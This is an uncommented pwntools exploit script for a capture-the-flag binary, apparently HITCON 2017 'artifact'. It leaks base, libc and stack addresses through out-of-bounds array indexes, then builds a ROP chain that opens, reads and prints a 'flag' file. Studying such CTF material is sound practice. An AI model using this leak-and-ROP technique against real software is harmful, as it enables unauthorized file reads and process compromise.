from pwn import *

io = process('./hitcon17_artifact_artifact')
gdb.attach(io)



io.sendlineafter('Choice?','1')
io.sendlineafter('Idx?','-3')
io.recvuntil('is: ')
x=io.recvline()
base = hex(int(x)-2864)

io.sendlineafter('Choice?','1')
io.sendlineafter('Idx?','-23')
io.recvuntil('is: ')
x=io.recvline()
system = hex(int(x)-769591)
libc = hex(int(system,16)+812112+27-1161547)

io.sendlineafter('Choice?','1')
io.sendlineafter('Idx?','200')
io.recvuntil('is: ')
x=io.recvline()
stack = hex(int(x)-216)



print libc,base,stack

io.sendlineafter('Choice?','2')
io.sendlineafter('Idx?','230')
io.sendlineafter('number:',str(1734437990))

io.sendlineafter('Choice?','2')
io.sendlineafter('Idx?','203')
io.sendlineafter('number:',str(int(libc,16)+167924))  #pop rax; ret 

io.sendlineafter('Choice?','2')
io.sendlineafter('Idx?','204')
io.sendlineafter('number:',str(2))

io.sendlineafter('Choice?','2')
io.sendlineafter('Idx?','205')
io.sendlineafter('number:',str(int(libc,16)+158642))  #pop rdi;ret 

io.sendlineafter('Choice?','2')
io.sendlineafter('Idx?','206')
io.sendlineafter('number:',str(int(stack,16)+216))

io.sendlineafter('Choice?','2')
io.sendlineafter('Idx?','207')
io.sendlineafter('number:',str(int(libc,16)+159900))  #pop rsi;ret 

io.sendlineafter('Choice?','2')
io.sendlineafter('Idx?','208')
io.sendlineafter('number:',str(0))

io.sendlineafter('Choice?','2')
io.sendlineafter('Idx?','209')
io.sendlineafter('number:',str(int(libc,16)+1164321)) #pop rdx; pop r12;ret

io.sendlineafter('Choice?','2')
io.sendlineafter('Idx?','210')
io.sendlineafter('number:',str(2))

io.sendlineafter('Choice?','2')
io.sendlineafter('Idx?','211')
io.sendlineafter('number:',str(0))

io.sendlineafter('Choice?','2')
io.sendlineafter('Idx?','212')
io.sendlineafter('number:',str(int(libc,16)+418201))  #syscall ; ret





io.sendlineafter('Choice?','2')
io.sendlineafter('Idx?','213')
io.sendlineafter('number:',str(int(libc,16)+167924))  #pop rax; ret 

io.sendlineafter('Choice?','2')
io.sendlineafter('Idx?','214')
io.sendlineafter('number:',str(0))

io.sendlineafter('Choice?','2')
io.sendlineafter('Idx?','215')
io.sendlineafter('number:',str(int(libc,16)+158642))  #pop rdi;ret 

io.sendlineafter('Choice?','2')
io.sendlineafter('Idx?','216')
io.sendlineafter('number:',str(3))

io.sendlineafter('Choice?','2')
io.sendlineafter('Idx?','217')
io.sendlineafter('number:',str(int(libc,16)+159900))  #pop rsi;ret 

io.sendlineafter('Choice?','2')
io.sendlineafter('Idx?','218')
io.sendlineafter('number:',str(int(base,16)+2105368))

io.sendlineafter('Choice?','2')
io.sendlineafter('Idx?','219')
io.sendlineafter('number:',str(int(libc,16)+1164321)) #pop rdx; pop r12;ret

io.sendlineafter('Choice?','2')
io.sendlineafter('Idx?','220')
io.sendlineafter('number:',str(22))

io.sendlineafter('Choice?','2')
io.sendlineafter('Idx?','221')
io.sendlineafter('number:',str(0))

io.sendlineafter('Choice?','2')
io.sendlineafter('Idx?','222')
io.sendlineafter('number:',str(int(libc,16)+418201))  #syscall ; ret




io.sendlineafter('Choice?','2')
io.sendlineafter('Idx?','223')
io.sendlineafter('number:',str(int(libc,16)+167924))  #pop rax; ret 

io.sendlineafter('Choice?','2')
io.sendlineafter('Idx?','224')
io.sendlineafter('number:',str(1))

io.sendlineafter('Choice?','2')
io.sendlineafter('Idx?','225')
io.sendlineafter('number:',str(int(libc,16)+158642))  #pop rdi;ret 

io.sendlineafter('Choice?','2')
io.sendlineafter('Idx?','226')
io.sendlineafter('number:',str(1))

io.sendlineafter('Choice?','2')
io.sendlineafter('Idx?','227')
io.sendlineafter('number:',str(int(libc,16)+418201))  #syscall ; ret



io.sendlineafter('Choice?','3')

io.interactive()
